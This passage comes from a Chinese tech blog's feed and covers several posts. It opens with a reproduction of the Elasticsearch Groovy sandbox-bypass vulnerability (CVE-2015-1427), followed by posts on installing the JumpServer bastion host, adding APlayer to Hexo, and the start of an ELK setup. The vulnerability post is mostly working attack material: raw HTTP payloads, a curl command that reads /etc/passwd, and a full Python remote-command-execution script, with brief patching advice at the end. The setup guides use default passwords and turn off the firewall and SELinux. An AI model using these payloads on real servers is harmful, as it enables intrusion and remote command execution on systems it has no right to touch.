2.升级到最新系统 ElasticSearch Groovy 沙盒绕过 &amp;&amp; 代码执行漏洞（CVE-2015-1427）漏洞背景:在2014年爆出的(CVE-2014-3120)漏洞，漏洞产生的原因是由于搜索引擎支持使用脚本代码(MVEL)作为表达式进行数据操作，攻击者可以通过MVEL构造执行任意Java代码，后来脚本语言引擎换成了Groovy，并且加入了沙盒进行控制，危险的代码会被拦截，结果这次由于沙盒限制的不严格，导致远程代码执行,也即是我们这次复现的漏洞:ElasticSearch Groovy 沙盒绕过 &amp;&amp; 代码执行漏洞（CVE-2015-1427）。 影响版本:影响版本是Elasticsearch 1.3.0-1.3.7 和 1.4.0-1.4.2 的Groovy 脚本引擎存在漏洞。 这个漏洞允许攻击者构造Groovy脚本绕过沙箱检查执行shell命令。 目前已修复的版本是Elasticsearch 1.3.8 和 1.4.3，建议用户更新到最新版本。 漏洞复现:攻击思路:ElasticSearch支持使用“在沙盒中的”Groovy语言作为动态脚本，但显然官方的工作并没有做好。lupin和tang3分别提出了两种执行命令的方法： 既然对执行Java代码有沙盒，lupin的方法是想办法绕过沙盒，比如使用Java反射 Groovy原本也是一门语言，于是tang3另辟蹊径，使用Groovy语言支持的方法，来直接执行命令，无需使用Java语言 所以，根据这两种执行漏洞的思路，我们可以获得两个不同的POC。 Java沙盒绕过法： 1java.lang.Math.class.forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;id&quot;).getText() Goovy直接执行命令法： 1def command=&apos;id&apos;;def res=command.execute().text;res 漏洞测试:首先先判断目标系统的elasticsearch是否可以正常访问 由于查询时至少要求es中有一条数据，所以我们发送如下数据包，增加一个数据： 123456789101112POST /website/blog/ HTTP/1.1Host: 192.168.15.130:9200Accept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 25&#123; &quot;name&quot;: &quot;test&quot;&#125; 然后发送包含payload的数据包，执行任意命令： 12345678910POST /_search?pretty HTTP/1.1Host: 192.168.15.130:9200Accept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: application/textContent-Length: 156&#123;&quot;size&quot;:1, &quot;script_fields&quot;: &#123;&quot;lupin&quot;:&#123;&quot;lang&quot;:&quot;groovy&quot;,&quot;script&quot;: &quot;java.lang.Math.class.forName(\&quot;java.lang.Runtime\&quot;).getRuntime().exec(\&quot;id\&quot;).getText()&quot;&#125;&#125;&#125; 也可以使用火狐的插件hackbar去发送post数据包实现命令执行 或者使用curl去发送数据包实现命令执行 1curl -XPOST http://ip:9200/_search?pretty=true -d &apos;&#123;&quot;size&quot;:1,&quot;script_fields&quot;: &#123;&quot;test#&quot;: &#123;&quot;script&quot;:&quot;java.lang.Math.class.forName(\&quot;java.io.BufferedReader\&quot;).getConstructor(java.io.Reader.class).newInstance(java.lang.Math.class.forName(\&quot;java.io.InputStreamReader\&quot;).getConstructor(java.io.InputStream.class).newInstance(java.lang.Math.class.forName(\&quot;java.lang.Runtime\&quot;).getRuntime().exec(\&quot;cat /etc/passwd\&quot;).getInputStream())).readLines()&quot;,&quot;lang&quot;: &quot;groovy&quot;&#125;&#125;&#125;&apos; ​ python编写的POC 1234567891011121314151617181920212223242526272829303132#!/usr/bin/env python#-*-coding:utf-8-*-import urllibimport urllib2import jsonimport sysdef execute(url,command):parameters = &#123; &quot;size&quot;:1, &quot;script_fields&quot;: &#123;&quot;iswin&quot;: &#123; &quot;script&quot;:&quot;java.lang.Math.class.forName(\&quot;java.io.BufferedReader\&quot;).getConstructor(java.io.Reader.class).\newInstance(java.lang.Math.class.forName(\&quot;java.io.InputStreamReader\&quot;).getConstructor(java.io.InputStream.\class).newInstance(java.lang.Math.class.forName(\&quot;java.lang.Runtime\&quot;).getRuntime().exec(\&quot;%s\&quot;).\getInputStream())).readLines()&quot; % command, &quot;lang&quot;: &quot;groovy&quot; &#125; &#125; &#125;data = json.dumps(parameters)try: request=urllib2.Request(url+&quot;_search?pretty&quot;,data) request.add_header(&apos;User-Agent&apos;, &apos;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36&apos;) response=urllib2.urlopen(request) result = json.loads(response.read())[&quot;hits&quot;][&quot;hits&quot;][0][&quot;fields&quot;][&quot;iswin&quot;][0]for i in result: print iexcept Exception, e: print eif __name__ == &apos;__main__&apos;: if len(sys.argv) != 3: print &quot;usage %s url command&quot; % sys.argv[0] else: execute(sys.argv[1],sys.argv[2]) 用法: 12python Elasticsearch.py target ifconfigpython Elasticsearch.py target &apos;uname -a&apos; 修复方法:关闭groovy沙盒以已停止动态脚本的使用： 1script.groovy.sandbox.enabled: false 安全建议: elasticsearch禁止向外网开放 elasticsearch在启动的时候以非root用户启动. 如果业务需要外网开放时,增加严格权限验证 关注官方动态,使用最新版本]]></content>
      <categories>
        <category>中间件漏洞</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JumpServer运维堡垒机安装及实战]]></title>
    <url>%2F2019%2F07%2F02%2Fjumpserver%2F</url>
    <content type="text"><![CDATA[海纳百川，有容乃大；壁立千仞，无欲则刚! 需求分析随着企业信息化进程不断深入，企业的IT系统变得日益复杂，不同背景的运维人员违规操作导致的安全问题变得日益突出起来，主要表现在：内部人员操作的安全隐患、第三方维护人员安全隐患、高权限账号滥用风险、系统共享账号安全隐患、违规行为无法控制的风险。 运维操作过程是导致安全事件频发的主要环节，所以对运维操作过程的安全管控就显得极为重要。而防火墙、防病毒、入侵检测系统等常规的安全产品可以解决一部分安全问题，但对于运维人员的违规操作却无能为力。如何转换运维安全管控模式，降低人为安全风险，满足企业要求，是当下所面临的迫切需求。 审计管理审计管理其实很简单，就是把用户的所有操作都纪录下来，以备日后的审计或者事故后的追责。在纪录用户操作的过程中有一个问题要注意，就是这个纪录对于操作用户来讲是不可见的，什么意思？就是指，无论用户愿不愿意，他的操作都会被纪录下来，并且，他自己如果不想操作被纪录下来，或想删除已纪录的内容，这些都是他做不到的，这就要求操作日志对用户来讲是不可见和不可访问的，那么我们就可以通过堡垒机就可以很好的实现。 补充，跳板机和堡垒机得区别： 跳板机，只有跳转登录得功能。 如果跳板机提供了以下两条，叫做审计系统或堡垒机 记录用户操作 实现了权限管理 堡垒要想成功完全记到他的作用，只靠堡垒机本身是不够的， 还需要一系列安全上对用户进行限制的配合，堡垒机部署上后，同时要确保你的网络达到以下条件： 所有人包括运维、开发等任何需要访问业务系统的人员，只能通过堡垒机访问业务系统 回收所有对业务系统的访问权限，做到除了堡垒机管理人员，没有人知道业务系统任何机器的登录密码 网络上限制所有人员只能通过堡垒机的跳转才能访问业务系统 确保除了堡垒机管理员之外，所有其它人对堡垒机本身无任何操作权限，只有一个登录跳转功能 确保用户的操作纪录不能被用户自己以任何方式获取到并篡改 堡垒机功能实现需求业务需求: 兼顾业务安全目标与用户体验，堡垒机部署后，不应使用户访问业务系统的访问变的复杂，否则工作将很难推进，因为没人喜欢改变现状，尤其是改变后生活变得更艰难 保证堡垒机稳定安全运行， 没有100%的把握，不要上线任何新系统，即使有100%把握，也要做好最坏的打算，想好故障预案 功能需求： 所有的用户操作日志要保留在数据库中 每个用户登录堡垒机后，只需要选择具体要访问的设置，就连接上了，不需要再输入目标机器的访问密码 允许用户对不同的目标设备有不同的访问权限，例: ​ 对10.0.2.34 有mysql 用户的权限 ​ 对192.168.3.22 有root用户的权限 ​ 对172.33.24.55 没任何权限 分组管理，即可以对设置进行分组，允许用户访问某组机器，但对组里的不同机器依然有不同的访问权限 Jumpserver堡垒机堡垒机的主要作用权限控制和用户行为审计，堡垒机就像一个城堡的大门，城堡里的所有建筑就是你不同的业务系统 ， 每个想进入城堡的人都必须经过城堡大门并经过大门守卫的授权，每个进入城堡的人必须且只能严格按守卫的分配进入指定的建筑，且每个建筑物还有自己的权限访问控制，不同级别的人可以到建筑物里不同楼层的访问级别也是不一样的。还有就是，每个进入城堡的人的所有行为和足迹都会被严格的监控和纪录下来，一旦发生犯罪事件，城堡管理人员就可以通过这些监控纪录来追踪责任人。 目前比较优秀的开源软件是jumpserver，认证、授权、审计、自动化、资产管理，适合中小型公司或服务器不多的情况。商业的堡垒机Citrix XenApp、齐治包括一些云机构提供的堡垒机这里不做记录。 Jumpserver简介官网地址:http://www.jumpserver.org/ Jumpserver 是全球首款完全开源的堡垒机, 使用 GNU GPL v2.0 开源协议, 是符合 4A 的专业运维审计系统。 Jumpserver 使用 Python / Django 进行开发, 遵循 Web 2.0 规范, 配备了业界领先的 Web Terminal 解决方案, 交互界面美观、用户体验好。 Jumpserver 采纳分布式架构, 支持多机房跨区域部署, 中心节点提供 API, 各机房部署登录节点, 可横向扩展、无并发访问限制。 Jumpserver 现已支持管理 SSH、 Telnet、 RDP、 VNC 协议资产。 改变世界, 从一点点开始。 jumpserver堡垒机组件说明：1、Jumpserver： 现指 Jumpserver 管理后台，是核心组件（Core）, 使用 Django Class Based View 风格开发，支持 Restful API。 2、Coco： 实现了 SSH Server 和 Web Terminal Server 的组件，提供 SSH 和 WebSocket 接口, 使用 Paramiko 和 Flask 开发。 3、Luna： 现在是 Web Terminal 前端，计划前端页面都由该项目提供，Jumpserver 只提供 API，不再负责后台渲染html等。 jumpserver必备功能 Jumpserver提供的堡垒机必备功能 身份验证 Authentication 登录认证 资源统一登录和认证 LDAP认证 支持OpenID，实现单点登录 多因子认证 MFA（Google Authenticator） 账号管理 Account 集中账号管理 管理用户管理 系统用户管理 统一密码管理 资产密码托管 自动生成密码 密码自动推送 密码过期设置 批量密码变更(X-PACK) 定期批量修改密码 生成随机密码 多云环境的资产纳管(X-PACK) 对私有云、公有云资产统一纳管 授权控制 Authorization 资产授权管理 资产树 资产或资产组灵活授权 节点内资产自动继承授权 RemoteApp(X-PACK) 实现更细粒度的应用级授权 组织管理(X-PACK) 实现多租户管理，权限隔离 多维度授权 可对用户、用户组或系统角色授权 指令限制 限制特权指令使用，支持黑白名单 统一文件传输 SFTP 文件上传/下载 文件管理 Web SFTP 文件管理 安全审计 Audit 会话管理 在线会话管理 历史会话管理 录像管理 Linux 录像支持 Windows 录像支持 指令审计 指令记录 文件传输审计 上传/下载记录审计 开始安装:安装实验环境:jumpserver服务端:192.168.48.133,redhat7.4系统 上传安装包到服务端的/opt目录 123链接：https://pan.baidu.com/s/1Ag4Uz7-SaQHddhAiKSiddA 提取码：rrg6 复制这段内容后打开百度网盘手机App，操作更方便哦 1234567[root@localhost opt]# ll总用量 24220drwxr-xr-x. 5 root root 194 6月 8 2018 cocodrwxr-xr-x. 11 root root 253 6月 8 2018 jumpserver-rw-r--r--. 1 root root 7910019 4月 10 2018 luna.tar.gz-rw-r--r--. 1 root root 16872064 4月 10 2018 Python-3.6.1.tar.xzdrwxr-xr-x. 2 root root 8192 6月 8 2018 python-package 关闭系统防火墙和selinux 12[root@localhost ~]# systemctl stop firewalld [root@localhost ~]# setenforce 0 查看当前系统语言环境: 12[root@localhost ~]# cat /etc/locale.conf LANG=&quot;zh_CN.UTF-8&quot; 如果不是utf-8格式的话,那么需要去修改环境变量 1234567[root@localhost ~]# localedef -c -f UTF-8 -i zh_CN zh_CN.UTF-8 [root@localhost ~]# export LC_ALL=zh_CN.UTF-8 [root@localhost ~]# echo &apos;LANG=zh_CN.UTF-8&apos; &gt; /etc/locale.conf [root@localhost ~]# exit 再重新连接， 这样语言环境就改变了。 安装依赖包注:在安装之前,可以开启yum缓存功能,把软件包下载下来,方便后期使用 1234[root@localhost ~]# vim /etc/yum.conf 改：keepcache=0 为：keepcache=1 安装所需要的软件包 1[root@localhost ~]# yum -y install wget sqlite-devel xz gcc automake zlib-devel openssl-devel epel-release git 编译安装python3.6.1 123[root@localhost ~]# cd /opt[root@localhost ~]# tar xvf Python-3.6.1.tar.xz &amp;&amp; cd Python-3.6.1[root@localhost ~]# ./configure &amp;&amp; make -j 4 &amp;&amp; make install 这里必须执行编译安装，否则在安装 Python 库依赖时会有麻烦… 然后我们创建个python3的虚拟环境 因为 CentOS 6/7 自带的是 Python2，而 Yum 等工具依赖原来的 Python，为了不扰乱原来的环境我们来使用 Python 虚拟环境 123456[root@localhost ~]# cd /opt[root@localhost ~]# python3 -m venv py3 [root@localhost ~]# source /opt/py3/bin/activate(py3) [root@localhost ~]# #切换成功的，前面有一个py3 标识(py3) [root@localhost opt]# python -VPython 3.6.1 因为jumpserver是基于python3的环境,所以就需要安装python3 开始安装12345(py3) [root@localhost opt]# cd jumpserver/ (py3) [root@localhost jumpserver]# ls (py3) [root@localhost jumpserver]# cd requirements/ 安装jumpserver所需要的数据包 1234(py3) [root@localhost requirements]# yum install -y `cat rpm_requirements.txt` 或者 (py3) [root@localhost requirements]# yum install -y $(cat rpm_requirements.txt) 如果有些软件安装不上的话,使用以下源 1234567891011121314151617181920212223242526[epel]name=Extra Packages for Enterprise Linux 7 - $basearchbaseurl=https://mirrors.tuna.tsinghua.edu.cn/epel/7/$basearch#mirrorlist=https://mirrors.fedoraproject.org/metalink?repo=epel-7&amp;arch=$basearchfailovermethod=priorityenabled=1gpgcheck=1gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-EPEL-7[epel-debuginfo]name=Extra Packages for Enterprise Linux 7 - $basearch - Debugbaseurl=https://mirrors.tuna.tsinghua.edu.cn/epel/7/$basearch/debug#mirrorlist=https://mirrors.fedoraproject.org/metalink?repo=epel-debug-7&amp;arch=$basearchfailovermethod=priorityenabled=0gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-EPEL-7gpgcheck=1[epel-source]name=Extra Packages for Enterprise Linux 7 - $basearch - Sourcebaseurl=https://mirrors.tuna.tsinghua.edu.cn/epel/7/SRPMS#mirrorlist=https://mirrors.fedoraproject.org/metalink?repo=epel-source-7&amp;arch=$basearchfailovermethod=priorityenabled=0gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-EPEL-7gpgcheck=1 安装python依赖库,因为要从requirements.txt文件读取python依赖包,然后下载,但由于软件包太多,所以使用pip本地安装 123(py3) [root@localhost python-package]# (py3) [root@localhost python-package]# pip install ./* 安装redis,因为jumpserver中调用redis做cache和celery broke 1(py3) [root@localhost python-package]# yum install redis -y 启动redis 1(py3) [root@localhost python-package]# systemctl enable redis;systemctl start redis 安装数据库进行缓存数据 1(py3) [root@localhost ~]# yum install mariadb mariadb-devel mariadb-server -y 开启数据库 1(py3) [root@localhost ~]# systemctl enable mariadb ; systemctl start mariadb 创建数据库jumpserver并授权 12345678910MariaDB [(none)]&gt; create database jumpserver default charset &apos;utf8&apos;;Query OK, 1 row affected (0.00 sec)#设置用户jumpserver@127.0.0.1对jumpserver数据库所有表都有权限,并设置密码为123456MariaDB [(none)]&gt; grant all on jumpserver.* to &apos;jumpserver&apos;@&apos;127.0.0.1&apos; identified by &apos;123456&apos;;Query OK, 0 rows affected (0.00 sec)MariaDB [(none)]&gt; exitBye 修改配置文件 123456789101112131415(py3) [root@localhost opt]# cd jumpserver/(py3) [root@localhost jumpserver]# cp config_example.py config.py (py3) [root@localhost jumpserver]# vim config.py #python是以空格作为缩进的,所以需要注意格式# SQLite setting: DB_ENGINE = &apos;sqlite3&apos; DB_NAME = os.path.join(BASE_DIR, &apos;data&apos;, &apos;db.sqlite3&apos;) #MySQL or postgres setting like: DB_ENGINE = &apos;mysql&apos; DB_HOST = &apos;127.0.0.1&apos; DB_PORT = 3306 DB_USER = &apos;jumpserver&apos; DB_PASSWORD = &apos;123456&apos; DB_NAME = &apos;jumpserver&apos; 生成数据库表结构和初始化数据 12(py3) [root@localhost jumpserver]# cd /opt/jumpserver/utils/(py3) [root@localhost utils]# bash make_migrations.sh 启动服务 -d参数表示在后台启动 1(py3) [root@localhost jumpserver]# ./jms start all -d 访问主机的8080端口,默认用户名密码为admin/admin 安装coco安装ssh server和websocket server:coco 当点击web终端的时候会出现以下错误,因为我们没有部署luna和coco,所以无法使用web终端 安装coco的依赖包,为rpm和python数据包 12345(py3) [root@localhost jumpserver]# cd /opt/coco/requirements/ (py3) [root@localhost requirements]# yum -y install $(cat rpm_requirements.txt) (py3) [root@localhost requirements]# pip install -r requirements.txt 注:使用pip download -r requirements.txt可以直接把python包下到本地 修改配置文件 12345(py3) [root@localhost requirements]# cd /opt/coco/ (py3) [root@localhost coco]# cp conf_example.py conf.py (py3) [root@localhost coco]# chmod +x cocod 运行服务 1(py3) [root@localhost coco]# ./cocod start -d 安装web terminal前端lunaLuna概述:Luna现在是web terminal前端,计划前端页面都由该项目提供,jumpserver只提供API,不再负责后台渲染HTML等 123[root@localhost ~]# cd /opt/ [root@localhost opt]# tar zxvf luna.tar.gz 也可以直接去在线下载 1wget https://github.com/jumpserver/luna/releases/download/v1.0.0/luna.tar.gz 配置nginx,整合各个组件 安装nginx 1[root@localhost luna]# yum install nginx -y 修改配置文件 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960[root@localhost ~]# vim /etc/nginx/conf.d/server &#123; listen 80; client_max_body_size 100m; # 录像及文件上传大小限制 location /luna/ &#123; try_files $uri / /index.html; alias /opt/luna/; # luna 路径, 如果修改安装目录, 此处需要修改 &#125; location /media/ &#123; add_header Content-Encoding gzip; root /opt/jumpserver/data/; # 录像位置, 如果修改安装目录, 此处需要修改 &#125; location /static/ &#123; root /opt/jumpserver/data/; # 静态资源, 如果修改安装目录, 此处需要修改 &#125; location /socket.io/ &#123; proxy_pass http://localhost:5000/socket.io/; proxy_buffering off; proxy_http_version 1.1; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection &quot;upgrade&quot;; proxy_set_header X-Real-IP $remote_addr; proxy_set_header Host $host; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; access_log off; &#125; location /coco/ &#123; proxy_pass http://localhost:5000/coco/; proxy_set_header X-Real-IP $remote_addr; proxy_set_header Host $host; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; access_log off; &#125; location /guacamole/ &#123; proxy_pass http://localhost:8081/; proxy_buffering off; proxy_http_version 1.1; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection $http_connection; proxy_set_header X-Real-IP $remote_addr; proxy_set_header Host $host; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; access_log off; &#125; location / &#123; proxy_pass http://localhost:8080; proxy_set_header X-Real-IP $remote_addr; proxy_set_header Host $host; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; &#125;&#125; 运行 Nginx 12$ nginx -t # 确保配置没有问题, 有问题请先解决$ systemctl restart nginx 访问虚拟机地址,默认账号:admin,密码:admin 确定已安装成功之后到会话管理–终端管理,接受coco的注册,点接受 测试连接: 1py3) [root@localhost coco]# netstat -antup | grep 2222 tcp 0 0 0.0.0.0:2222 0.0.0.0:* LISTEN 3343/python3 本地使用ssh进行连接,账号admin,密码admin,端口2222 12345678910111213(py3) [root@localhost coco]# ssh -p 2222 admin@192.168.48.137 Administrator, 欢迎使用Jumpserver开源跳板机系统 1) 输入 ID 直接登录 或 输入部分 IP,主机名,备注 进行搜索登录(如果唯一). 2) 输入 / + IP, 主机名 or 备注 搜索. 如: /ip 3) 输入 P/p 显示您有权限的主机. 4) 输入 G/g 显示您有权限的主机组. 5) 输入 G/g + 组ID 显示该组下主机. 如: g1 6) 输入 H/h 帮助. 0) 输入 Q/q 退出.Opt&gt; JumpServer实战添加站点1.登陆进系统–&gt;系统设置–&gt;设置当前站点URL为服务器地址—-&gt;提交 设置邮箱 注:使用该功能必须确定自己的邮箱已开启了smtp和pop3服务 服务器地址: 网易邮箱: 12345pop服务器:pop.163.comsmtp:smtp.163.comimap:imap.163.com 配置完成之后,需要手动重启服务,不然后期创建用户,收不到邮箱 1(py3) [root@localhost jumpserver]# ./jms restart all -d 配置邮件服务后，点击页面的”测试连接”按钮，如果配置正确，Jumpserver 会发送一条测试邮件到您的 SMTP 账号邮箱里面： 注意： 在使用jumpserver过程中，有一步是系统用户推送，要推送成功，client（后端服务器）要满足以下条件： 1）后端服务器需要有python、sudo环境才能使用推送用户，批量命令等功能 2）后端服务器如果开启了selinux，请安装libselinux-python。一般情况服务器上都关闭了selinux 用户管理1)添加用户组 用户名即jumpserver登陆账号,用户组是用来资产授权,当某个资产对一个用户组授权后,这个用户组下面的所有用户都可以使用这个资产了.角色用于区分一个用户是管理员还是普通用户. 点击用户管理–&gt;用户组–&gt;添加用户组 创建用户,并将其添加到刚刚创建的jumpserver组中 密码会自动产生,并通过邮件发送到用户邮箱中 然后登陆账号,首次登陆需要填写信息 第二步需要ssh公钥,所以本地生成一个公钥 123456789101112131415161718192021[root@localhost ~]# ssh-keygen Generating public/private rsa key pair.Enter file in which to save the key (/root/.ssh/id_rsa): Enter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in /root/.ssh/id_rsa.Your public key has been saved in /root/.ssh/id_rsa.pub.The key fingerprint is:SHA256:8bIwbzG55sTSvCCGCgI/ajtdxeOp6UXJfBDBcG6jgyo root@localhost.localdomainThe key&apos;s randomart image is:+---[RSA 2048]----+| .o+. || o.. || .=. || . =+++ ||. . o==S.. ||.... .oX.* ||E.= + =.@ ||+= + +.B . ||+.o .. o |+----[SHA256]-----+ 粘贴公钥填入个人信息中 12345[root@localhost ~]# cd .ssh/[root@localhost .ssh]# lsid_rsa id_rsa.pub known_hosts[root@localhost .ssh]# cat id_rsa.pub ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQClEDeVNMYP61JPrCXUQHQYC1ddIpPqroNrQn3SXZXLfef2g0c5xmwlHqgiHEjBGLR+0TIjkXDFY0Z9JU/TebGyrBbo9bTM0tkxVfWVAR/Ayba7yN98Sr43evev1yHIsg31eyPa2wE6TRmpz6jCHTMOodw4+TMkfiXdPDyw2Ny+6zOXGtK8Kz2Sie1SCgSWrNaGp364aZInjB7J2H5fCXLwW6SQqmcwer29q2djNw0ILc4acYpDe+pOMm2CGbnFvTaB6T9A1hfdpmQ74TnfI4frukM2vUqKwms6/At+TVqvWl+RX9jU83y7pOSoWZeRKKoJct4frpcPghAYJI1+qhtz root@localhost.localdomain 创建资产创建Linux资产 编辑资产树 节点名不能重名,右击节点可以添加,删除和重命名节点,以及进行资产相关的操作. 创建管理用户jumpserver里各个用户的说明 管理用户是服务器的 root，或拥有 NOPASSWD: ALL sudo 权限的用户，Jumpserver 使用该用户来推送系统用户、获取资产硬件信息等。 创建系统用户 系统用户是 Jumpserver 跳转登录资产时使用的用户，可以理解为登录资产用户， Jumpserver使用系统用户登录资产。 系统用户的 Sudo 栏填写允许当前系统用户免sudo密码执行的程序路径，如默认的/sbin/ifconfig，意思是当前系统用户可以直接执行 ifconfig 命令或 sudo ifconfig 而不需要输入当前系统用户的密码，执行其他的命令任然需要密码，以此来达到权限控制的目的。 # 此处的权限应该根据使用用户的需求汇总后定制，原则上给予最小权限即可。 系统用户创建时，如果选择了自动推送 Jumpserver 会使用 Ansible 自动推送系统用户到资产中，如果资产(交换机、Windows )不支持 Ansible, 请手动填写账号密码。 Linux 系统协议项务必选择 ssh 。如果用户在系统中已存在，请去掉自动生成密钥、自动推送勾选。 创建资产点击页面左侧的“资产管理”菜单下的“资产列表”按钮，查看当前所有的资产列表。 点击页面左上角的“创建资产”按钮，进入资产创建页面，填写资产信息。 IP 地址和管理用户要确保正确，确保所选的管理用户的用户名和密码能”牢靠”地登录指定的 IP 主机上。资产的系统平台也务必正确填写。公网 IP 信息只用于展示，可不填，Jumpserver 连接资产使用的是 IP 信息。 再次更新之后就变成了可连接的了 也可以去测试资产是否可以连接 如果资产不能正常连接，请检查管理用户的用户名和密钥是否正确以及该管理用户是否能使用 SSH 从 Jumpserver 主机正确登录到资产主机上。 网域列表网域功能是为了解决部分环境无法直接连接而新增的功能，原理是通过网关服务器进行跳转登录。 这个功能，一般情况不用到。 资产授权节点，对应的是资产，代表该节点下的所有资产。 用户组，对应的是用户，代表该用户组下所有的用户。 系统用户，及所选的用户组下的用户能通过该系统用户使用所选节点下的资产。 节点，用户组，系统用户是一对一的关系，所以当拥有 Linux、Windows 不同类型资产时，应该分别给 Linux 资产和 Windows 资产创建授权规则。 在授权成功后,jumpserver会自动推送一个帐号，自动在资产服务器上创建系统用户 其原理就是在/etc/sudoers设置该用户的权限,sudo相关的规则也会被自动推送过来 1test1 ALL=(ALL) NOPASSWD: /sbin,/bin 用户使用资产登录 Jumpserver 创建授权规则的时候，选择了用户组，所以这里需要登录所选用户组下面的用户才能看见相应的资产。 使用无痕浏览器，再打开一个窗口，进行登录： 使用刚刚创建的用户haha去登陆,连接资产主机 也可以通过xshell去连接 12345678910111213141516171819[root@localhost ~]# ssh -p 2222 haha@192.168.48.139The authenticity of host &apos;[192.168.48.139]:2222 ([192.168.48.139]:2222)&apos; can&apos;t be established.RSA key fingerprint is SHA256:51aZmkQvw20kIozk9n3Sg0aGUJ6ZSJMQyJInC3HQ08w.RSA key fingerprint is MD5:82:e3:ef:bf:8e:5b:db:bd:e2:56:67:4e:08:e1:d1:b0.Are you sure you want to continue connecting (yes/no)? yesWarning: Permanently added &apos;[192.168.48.139]:2222&apos; (RSA) to the list of known hosts. haha, 欢迎使用Jumpserver开源跳板机系统 1) 输入 ID 直接登录 或 输入部分 IP,主机名,备注 进行搜索登录(如果唯一). 2) 输入 / + IP, 主机名 or 备注 搜索. 如: /ip 3) 输入 P/p 显示您有权限的主机. 4) 输入 G/g 显示您有权限的主机组. 5) 输入 G/g + 组ID 显示该组下主机. 如: g1 6) 输入 H/h 帮助. 0) 输入 Q/q 退出.Opt&gt; 在xshell字符终端下连接jumpserver管理服务器 输入ip或者ID直接可以连接到主机 12345678910Opt&gt; 192.168.48.139Connecting to test1@资产主机 0.4Last login: Thu Jun 13 00:27:36 2019 from 192.168.48.139[test1@localhost ~]$ whoamitest1[test1@localhost ~]$ exit登出Opt&gt; 输入p(不区分大小写)查看你有权限的主机 123456Opt&gt; p ID Hostname IP LoginAs Comment 1 资产主机 192.168.48.139 [检查服务器运行状态的用户] 总共: 1 匹配: 1 输入g(不区分大小写)查看你有权限的组 12345Opt&gt; g ID Name Assets Comment 1 jumpserver服务器 1 总共: 1 查看历史回话 查看历史命令]]></content>
      <categories>
        <category>运维技术</category>
      </categories>
      <tags>
        <tag>堡垒机</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hexo使用APlayer插入音乐]]></title>
    <url>%2F2019%2F06%2F26%2FHexo%20%E4%BD%BF%E7%94%A8%20APlayer%20%E6%8F%92%E5%85%A5%E9%9F%B3%E4%B9%90%2F</url>
    <content type="text"><![CDATA[带着感恩的心启程，学会爱，爱父母，爱自己，爱朋友，爱他人。 背景:以前一直使用网易云音乐去生成外链播放器,但因为好多的歌存在着版权问题,导致每次找背景歌曲都非常麻烦~无意在网上看到APlayer,Aplayer是一个html5的嵌入式播放器,将其用在博客中去插入音乐链接,非常的好用. APlayer支持： 媒体格式 MP4 H.264（AAC或MP3） WAVE PCM Ogg Theora Vorbis 特征 播放列表 歌词 开始安装:我用的是 next 主题，这里直接使用官网提供的CDN进行引入APlayer。也可以使用github的方式去安装https://github.com/MoePlayer/hexo-tag-aplayer/blob/master/docs/README-zh_cn.md 我们去编辑 /themes/next/layout/_partials/ 目录下的 header.swig，引入 Aplayer.js加入以下三行代码,插入到文件最后面即可 1&lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdn.jsdelivr.net/npm/aplayer@1.7.0/dist/APlayer.min.css&quot;&gt; 1&lt;script src=&quot;https://cdn.jsdelivr.net/npm/aplayer@1.7.0/dist/APlayer.min.js&quot;&gt;&lt;/script&gt; 1&lt;script src=&quot;https://cdn.jsdelivr.net/npm/meting@1.1.0/dist/Meting.min.js&quot;&gt;&lt;/script&gt; 如何使用使用方法很简单， 在markdown格式的博文中，在需要插入音乐的地方加入以下div即可： 1&lt;div class=&quot;aplayer&quot; data-id=&quot;108740&quot; data-server=&quot;netease&quot; data-type=&quot;song&quot; data-mode=&quot;single&quot;&gt;&lt;/div&gt; 效果图 常用参数 主要参数 值 data-id 歌曲/专辑/歌单 ID data-server netease（网易云音乐）tencent（QQ音乐） xiami（虾米） kugou（酷狗） data-type song （单曲） album （专辑） playlist （歌单） search （搜索） data-mode random （随机） single （单曲） circulation （列表循环） order （列表） data-autoplay false（手动播放） true（自动播放） 更多的参数可参考官方文档]]></content>
      <categories>
        <category>HEXO</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[部署ELK实时日志监控系统]]></title>
    <url>%2F2019%2F06%2F05%2F%E9%83%A8%E7%BD%B2ELK%E5%AE%9E%E6%97%B6%E6%97%A5%E5%BF%97%E7%9B%91%E6%8E%A7%E7%B3%BB%E7%BB%9F%2F</url>
    <content type="text"><![CDATA[我是一直在努力的学习思考并改变自己. 系统拓扑: 安装nginx安装nginx123[root@localhost ~]# yum install nginx -y[root@localhost ~]# /usr/sbin/nginx -vnginx version: nginx/1.12.2 修改其配置文件,将nginx日志格式转换为json格式 12345678910111213http &#123;log_format log_json &apos;&#123;&quot;remote_addr&quot;: &quot;$remote_addr&quot;, &apos; &apos;&quot;ident&quot;: &quot;-&quot;, &apos; &apos;&quot;user&quot;: &quot;$remote_user&quot;, &apos; &apos;&quot;timestamp&quot;: &quot;$time_local&quot;, &apos; &apos;&quot;request&quot;: &quot;$request&quot;, &apos; &apos;&quot;status&quot;: $status, &apos; &apos;&quot;bytes&quot;: $body_bytes_sent, &apos; &apos;&quot;referer&quot;: &quot;$http_referer&quot;, &apos; &apos;&quot;agent&quot;: 